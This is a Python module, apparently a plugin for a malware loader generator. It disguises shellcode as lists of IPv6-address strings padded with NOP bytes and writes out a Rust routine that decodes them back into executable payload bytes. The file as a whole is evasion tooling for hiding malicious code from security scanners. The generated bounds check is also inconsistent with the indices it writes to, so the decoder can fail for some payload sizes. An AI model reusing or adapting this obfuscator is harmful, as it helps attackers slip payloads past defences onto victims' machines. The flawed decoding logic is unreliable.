import random
import string

class IPv6Obfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []
    
    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = len(decoded)
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(':'.join([ f'{chunk[n]:02x}{chunk[n+1]:02x}' for n in range(0, 16, 2)]))
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}(&{{shellcode}})')

    def codeblock(self) -> str:
        return f"""
fn {self.name}(encoded: &Vec<String>) -> Vec<u8> {{
    let mut decoded = vec![0; {self.size}];
    for (i, ip) in encoded.iter().enumerate(){{
        let hextets: Vec<&str> = ip.split(':').collect();
        for (j, hextet) in hextets.iter().enumerate(){{
            if i*16+j >= {self.size}{{
                return decoded.to_vec()
            }}
            let converted = u16::from_str_radix(hextet, 16).unwrap().to_be_bytes();
            decoded[i*16 + j*2] = converted[0];
            decoded[i*16 + j*2 + 1] = converted[1];
        }}
    }}
    decoded
}}
"""